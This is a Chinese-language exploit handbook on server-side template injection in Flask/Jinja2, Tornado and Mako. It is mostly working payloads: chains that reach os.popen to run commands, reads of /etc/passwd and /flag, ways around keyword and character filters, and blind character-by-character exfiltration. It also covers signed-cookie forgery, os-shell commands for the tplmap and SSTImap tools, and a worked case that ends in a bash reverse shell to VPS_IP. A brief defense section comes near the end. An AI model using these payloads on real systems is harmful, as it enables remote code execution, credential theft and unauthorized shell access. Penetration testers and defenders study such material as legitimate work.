# EXP手册-服务端模板注入（SSTI）

## 一句话理解
Python 场景下的 SSTI 以 Flask/Jinja2 最常见，核心是攻击者通过模板表达式进入 Python 对象体系，逐步访问类、全局变量、内置函数与模块，最终实现文件读取或命令执行。

## 常见场景
- Flask `render_template_string()`
- Jinja2 动态模板
- 后台自定义模板、邮件模板、页面片段
- 调试页、错误页、预览页

## 基础判断
可先用：

```text
{{7*7}}
```

若返回 `49`，通常说明进入了模板表达式执行。

入门资料：
- [flask 之 SSTI 模板注入从零到入门](https://xz.aliyun.com/t/3679)

## 核心利用思路
典型路径是：
1. 确认表达式可执行
2. 获取基础类或对象根节点
3. 进入类继承链和子类列表
4. 找到可访问的函数、全局变量、模块
5. 实现文件读取或命令执行

## 获取基础类
> 偏旧写法：`__class__/__mro__/__subclasses__` 经典链路诞生于 Python2 时代，依赖子类索引、环境敏感。Python3 环境优先使用下一节「Python3 现代 Payload」的全局对象链，本节作为子类遍历的补充手段保留。

常见写法：

```python
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8]
```

当中括号被过滤时，可借助 `__getitem__`：

```python
''.__class__.__mro__.__getitem__(2)
{}.__class__.__bases__.__getitem__(0)
().__class__.__bases__.__getitem__(0)
request.__class__.__mro__.__getitem__(8)
```

常见属性说明：

```text
__class__：获得当前对象的类
__bases__：列出其基类
__mro__：方法解析顺序
__subclasses__()：返回子类列表
__dict__：当前属性/函数字典
func_globals / __globals__：函数全局变量
```

## Python3 现代 Payload
> 核心思路：不再依赖 `__subclasses__()` 索引（索引随环境漂移），而是利用 Flask/Jinja2 模板上下文中必然存在的函数对象（`lipsum`、`cycler`、`url_for`、`config`、`get_flashed_messages`），直接从其 `__globals__` 拿到 `os` 或 `__builtins__`。适用于 Jinja2 2.x/3.x + Python3。

### 1. 全局对象链（不依赖子类索引）

```text
# lipsum 是 Jinja2 内置全局函数，其模块（jinja2.utils）导入了 os —— 最短最稳的一条链
{{lipsum.__globals__['os'].popen('id').read()}}

# cycler 同为 Jinja2 内置对象，经 __init__.__globals__ 取 os
{{cycler.__init__.__globals__.os.popen('id').read()}}

# url_for 是 Flask 注入的全局函数，经 __builtins__ 拿 __import__ 再调用（注意是括号调用，不是下标）
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# config 对象的类构造器全局变量里同样可达 os
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# get_flashed_messages 经 __builtins__ 拿 eval，适合点号/中括号受限时变形
{{get_flashed_messages.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

> 提示：`__builtins__` 在不同环境下可能是 dict 或 module：dict 用 `['open']` 取，module 用 `.open` 取，一种报 AttributeError/TypeError 就换另一种。

链式 `|attr()` 写法（点号被过滤时逐级取属性，等价于点号链）：

```text
{{x|attr('__class__')|attr('__base__')|attr('__base__')|attr('__subclasses__')()}}

# lipsum 链的 attr 全版本
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

### 2. Python2/3 通吃链

```text
# '' 的 mro 在 Python2 为 [str, basestring, object]，Python3 为 [str, object]
# 索引 2 在 Python2 恰好是 object（通吃链由来），Python3 应改用索引 1
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

遍历思路（索引不可硬编码，先枚举再定位可用类）：

```text
# 第一步：dump 全部子类，肉眼找可用类（os._wrap_close / subprocess.Popen / warnings.catch_warnings / file 等）
{{ ''.__class__.__mro__[2].__subclasses__() }}

# 第二步：确认目标类索引 N 后，经其 __init__.__globals__ 拿 os（os._wrap_close 场景）
{{ ''.__class__.__mro__[2].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() }}
```

### 3. 高版本 Jinja2 沙箱下的上下文 Fuzz
`SandboxedEnvironment` 会拦截 `__globals__`、`__subclasses__` 等危险属性（抛 SecurityError），此时先摸清沙箱内还剩什么对象可达：

```text
{{request.__class__}}    # 请求对象类，判断是否连 _ 属性都被拦
{{session}}              # session 内容，可能直接存敏感数据
{{g}}                    # 应用级全局对象，看绑定了什么
{{config}}               # 配置对象：SECRET_KEY、数据库连接串、第三方密钥
{{self}}                 # 模板自身
{{namespace}}            # 命名空间对象
{{lipsum}}               # 确认内置函数是否仍可达
```

要点：
- 沙箱默认不拦 `config` / `request` / `session` 本体，信息泄露优先
- `{{config}}` 常能直接读到 `SECRET_KEY`，可配合 Flask session 伪造升级
- 若 `|attr` 过滤器可用且目标属性未进拦截名单，仍可尝试 `|attr('__class__')` 变形

### 4. 文件读取链

```text
# 老式：经 __subclasses__ 找 file 类，索引 40 仅在特定 Python2 环境成立，极不稳定，勿硬套
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# 现代：直接经内置函数全局变量拿 open，无需子类索引，稳定
{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}

# lipsum 链读文件（经 os.popen，兼容管道与目录遍历）
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
```

## 文件操作
> 注意：不同 Python 版本、不同运行环境中，`__subclasses__()` 的索引不固定，不能机械套用。

示例思路中，原文以 Python 2 为例：

```python
object.__subclasses__()[40]('/etc/passwd').read()
object.__subclasses__()[40]('/tmp').write('test')
```

实战要点：
- 先确认当前 Python 版本
- 先枚举子类，再定位文件相关类
- 不要假设索引在不同环境中稳定一致

## 执行命令
### 1. 借助 `func_globals` / `__globals__`
> 偏旧写法：以下为 Python2 时代示例，`func_globals` 在 Python3 已移除，索引 59 环境敏感。现代链路见「Python3 现代 Payload」。

原文示例：

```python
object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
```

或通过内置函数：

```python
object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

### 2. 常见高危函数与模块
以下对象一旦可达，通常具备较高利用价值：

#### `os`

```python
import os
os.system('ipconfig')
```

#### `exec`

```python
exec('__import__("os").system("ipconfig")')
```

#### `eval`

```python
eval('__import__("os").system("ipconfig")')
```

#### `timeit`

```python
import timeit
timeit.timeit("__import__('os').system('ipconfig')", number=1)
```

#### `platform`

```python
import platform
platform.popen('ipconfig').read()
```

#### `subprocess`

```python
import subprocess
subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
```

#### 文件读取函数

```python
file('/etc/passwd').read()
open('/etc/passwd').read()
```

```python
import codecs
codecs.open('/etc/passwd').read()
```

## Fuzz 与上下文探测
可先观察模板上下文里有哪些对象暴露出来：

```python
{{config}}
{{handler.settings}}
{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
```

常见请求对象入口：
- GET：`request.args`
- Cookies：`request.cookies`
- Headers：`request.headers`
- Environment：`request.environ`
- Values：`request.values`

## 其他模板引擎
### Tornado SSTI
Tornado 模板语法与 Jinja2 相近，但支持 `{% import %}` 语句，且 `handler`、`settings` 直接暴露在渲染上下文中。

```text
# 检测：返回 49 即存在模板求值
{{7*7}}

# 直接 import os 执行命令（Tornado 模板允许 import 语句）
{% import os %}
{{ os.popen('id').read() }}

# handler.settings 泄露：拿到 cookie_secret 后可离线伪造签名 cookie
{{handler.settings}}
```

拿到 `cookie_secret` 的常见后续：用 `tornado.web.create_signed_value()` 离线签发合法身份 cookie（伪造 `_signature`），绕过登录态校验。

### Mako SSTI
Mako 模板直接嵌入 Python 代码，`${}` 求值任意表达式，SSTI 危害等同直接 RCE。

```text
# ${} 内直接执行
${__import__("os").popen("id").read()}

# <% %> 代码块 + ${} 输出
<% import os; x=os.popen('id').read() %>${x}
```

## 常见绕过思路
- [Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)

常见绕过点：
- 中括号过滤，改用 `__getitem__`
- 点号过滤，改用属性函数或其他访问方式
- 关键字过滤，改用字符串拼接、编码或对象间接访问
- 黑名单只拦截少数危险单词，但未阻断对象图遍历

## 绕过技巧
> 前提：先黑盒探测过滤规则。依次测 `{{7*7}}`、`{{7*'7'}}`、`{{''.__class__}}`、`{{lipsum.__globals__}}`，观察报错/回显差异，确定过滤了哪些字符与关键字。

### 1. 过滤中括号 `[]`

```text
# __getitem__(N) 替代 [N]
{{ ''.__class__.__mro__.__getitem__(2) }}

# |attr() 替代 ['属性名']（配合点号绕过更佳）
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2) }}

# __getattribute__ 取属性
{{ ''.__getattribute__('__class__') }}
```

### 2. 过滤点号 `.`

```text
# |attr() 链逐级取属性
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2) }}

# 中括号直接取属性（点号与中括号很少同时被过滤）
{{ ''['__class__']['__mro__'][2] }}
```

### 3. 过滤下划线 `_`

```text
# |attr() + Unicode 编码（\u005f 即下划线）
{{ ''|attr("\u005f\u005fclass\u005f\u005f")|attr("\u005f\u005fbase\u005f\u005f") }}

# 十六进制编码（\x5f 即下划线）
{{ ''|attr("\x5f\x5fclass\x5f\x5f") }}

# lipsum 配合 attr 编码拿 os
{{ (lipsum|attr("\u005f\u005fglobals\u005f\u005f"))['os'].popen('id').read() }}

# request 对象传参绕过：模板内只引用变量名，敏感属性放 GET 参数
{{()|attr(request.args.a)}}&a=__class__
{{lipsum|attr(request.args.a)}}&a=__globals__
```

### 4. 过滤关键字（class / os / import 等）

```text
# 字符串拼接：拼接只能出现在表达式参数位（|attr() 或中括号内），不能直接写在属性位置
{{ ()|attr('__cla'+'ss__') }}
{{ ''['__cla'+'ss__'] }}

# 十六进制编码整个关键字
{{ ().__getattribute__("\x5f\x5fclass\x5f\x5f") }}

# request.args 变量传递，模板里完全不出现关键字
{{ ()|attr(request.args.c)|attr(request.args.b) }}&c=__class__&b=__base__
```

### 5. 过滤 `{{ }}`（语句盲注）

```text
# {% if %} 布尔盲注：条件成立输出 1，不成立无输出
{% if ''.__class__ %}1{% endif %}

# {% print %} 直接输出（Jinja2 支持）
{% print(lipsum.__globals__['os'].popen('id').read()) %}
```

配合布尔判断逐字符外带：

```text
# |list 转列表后下标取单字符，== 比对
{% if (lipsum.__globals__['os'].popen('cat /flag').read()|list)[0]=='f' %}1{% endif %}

# 二分加速：用 > < 缩小字符范围
{% if (lipsum.__globals__['os'].popen('cat /flag').read()|list)[0]>'f' %}1{% endif %}

# startswith 一次比对多个字符
{% if lipsum.__globals__['os'].popen('cat /flag').read().startswith('flag') %}1{% endif %}
```

### 6. 引擎识别对照（绕过前先确认语法）

| 输入 | 返回 | 引擎结论 |
| --- | --- | --- |
| `{{7*7}}` | `49` | 存在模板求值 |
| `{{7*'7'}}` | `7777777` | Jinja2（Python） |
| `{{7*'7'}}` | `49` | Twig（PHP） |
| `${7*7}` | `49` | Mako / FreeMarker / Velocity |
| `<%= 7*7 %>` | `49` | ERB / EJS |
| `#set($x=7*7)${x}` | `49` | Velocity |

## 实战排查思路
### 1. 先确认是不是 Python SSTI
结合：
- 报错栈
- Flask / Jinja2 特征
- 模板语法
- 响应中的对象名称

### 2. 先做最小求值
例如 `{{7*7}}`，确认不是普通字符串回显。

### 3. 再做对象图遍历
优先寻找：
- `config`
- `request`
- `self`
- `app`
- 可达函数对象

### 4. 最后再打命令执行
先文件读、环境变量读，再看是否存在稳定的命令执行链。

## 案例：Flask SSTI 完整利用流程
### 0. 漏洞代码

```python
# app.py —— 典型漏洞：用户输入直接拼接进模板源码
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', '')
    # 漏洞点：name 未经处理直接进入模板字符串
    template = '<h1>Hello {}!</h1>'.format(name)
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

flag 位于服务器 `/flag`。

### 1. 确认注入点

```text
?name={{7*7}}     → Hello 49!       求值成功，存在模板注入
?name={{7*'7'}}   → Hello 7777777!  Python 特征，确认 Jinja2（Twig 会返回 49）
```

### 2. 检测过滤规则

```text
?name={{''.__class__}}           → 正常回显 <class 'str'>，未过滤下划线与点号
?name={{''|attr('__class__')}}   → 正常，attr 可用
?name={{lipsum.__globals__}}     → 正常，globals 可达
```

若无回显，改用 `{% if ... %}1{% endif %}` 布尔探测。

### 3. 构造利用链（现代全局链）

```text
# 列目录定位 flag
?name={{lipsum.__globals__['os'].popen('ls /').read()}}
# 输出中发现 /flag

# 读 flag
?name={{lipsum.__globals__['os'].popen('cat /flag').read()}}
```

### 4. 反弹 shell（拿下交互权限）

```text
# VPS 先监听：nc -lvvp 4444
?name={{lipsum.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/VPS_IP/4444 0>&1"').read()}}
```

注意整体 URL 编码后发送（`&`、`>`、空格等字符需编码）。

### 5. 假设过滤 `_` 与 `os` 的绕过示例

```text
# 直接写 __globals__ / os 被拦，改用 Unicode 编码下划线 + 拼接关键字
?name={{lipsum|attr("\u005f\u005fglobals\u005f\u005f")|attr("\u005f\u005fgetitem\u005f\u005f")("o"+"s")|attr("popen")("cat /flag")|attr("read")()}}

# 或 request 传参，模板内零关键字
?name={{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr("popen")(request.args.d)|attr("read")()}}&a=__globals__&b=__getitem__&c=os&d=cat%20/flag
```

## 防御要点
### 1. 不要把用户输入当模板源码
只能作为变量渲染，不能直接喂给模板解释器。

### 2. 避免动态字符串渲染
谨慎使用 `render_template_string()` 等接口处理不可信输入。

### 3. 启用沙箱并限制对象暴露
不要把请求对象、应用对象、内置模块直接暴露给模板。

### 4. 不依赖黑名单
只过滤 `__class__`、`os`、`eval` 等关键字，通常挡不住对象链绕过。

## 工具
- [tplmap](https://github.com/epinna/tplmap)：经典 SSTI 自动化检测与利用（Python2）
  ```text
  python tplmap.py -u "http://target/?name=" --os-shell
  ```
- [SSTImap](https://github.com/vladko312/SSTImap)：tplmap 的 Python3 维护分支，功能更全，推荐使用
  ```text
  python sstimap.py -u "http://target/?name=John" -s
  python sstimap.py -u "http://target/page?name=test" --os-shell
  ```
- [TInjA](https://github.com/Hackmanit/TInjA)：基于 polyglot 的 SSTI/CSTI 高效扫描器（可作为 payload 生成器）
  ```text
  tinja url -u "http://target/?name=Kirlia"
  ```
- Burp 插件：
  - [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)：payload 编码转换（Unicode/Hex/拼接），绕过滤必备
  - Intruder + [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) payload 列表批量探测
- Payload 集合 / 在线速查：
  - [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)：按引擎分类的 payload 合集
  - [HackTricks SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/)：检测决策树 + 各引擎 payload 在线速查

## 速查清单
- 先测 `{{7*7}}` 判断是否存在求值
- 再找 `config`、`request`、`app`、`self`
- 再利用 `__class__`、`__mro__`、`__subclasses__()` 向对象根节点扩展
- 关注 Python 版本和子类索引差异
- 优先做文件读取，其次再构造稳定命令执行

## Reference
- [Flask/Jinja2 SSTI && python 沙箱逃逸](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)
- [Flask/Jinja2 模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)
- [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
- [Jinja2 官方文档](https://jinja.palletsprojects.com/)
- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
